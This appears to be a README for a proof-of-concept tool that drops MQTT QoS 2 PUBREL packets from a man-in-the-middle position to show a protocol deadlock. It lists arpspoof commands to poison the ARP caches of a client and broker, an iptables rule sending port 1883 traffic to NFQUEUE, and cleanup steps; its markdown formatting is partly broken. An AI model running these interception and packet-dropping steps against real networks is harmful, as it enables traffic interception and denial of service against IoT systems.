# MQTT QoS 2 `PUBREL` Dropper

This script acts as a packet handler to selectively drop MQTT `PUBREL` packets (control byte `0x60`) while allowing `PUBLISH` and `PUBREC` frames to pass. It is designed to be used in a Man-in-the-Middle (MITM) position to demonstrate the MQTT QoS 2 protocol-level deadlock condition.

## Prerequisites

The script is intended to run on a Linux environment (e.g., Kali Linux) positioned between the MQTT client and the broker.

Install the required Python dependencies:

```bash
pip install scapy NetfilterQueue

arpspoof -i <interface> -t <target_ip> <broker_ip>

# Spoof Target to Broker
arpspoof -i <interface> -t <broker_ip> <target_ip>
3. Configure IPtables
Redirect the forwarded MQTT traffic (default port 1883) into an NFQUEUE.

Bash


iptables -I FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
Usage
Once the network routing is configured and traffic is actively flowing through queue-num 1, execute the packet handler (requires root/sudo privileges to bind to the network queue):

Bash


sudo python3 mqtt_qos2_dropper.py
The script will monitor the forwarded traffic, parse the MQTT fixed headers, and explicitly drop any packet identified as a PUBREL frame.

Cleanup
After testing, ensure you clean up your IPtables rules to restore normal network flow:

Bash


# Flush the NFQUEUE rule
iptables -D FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
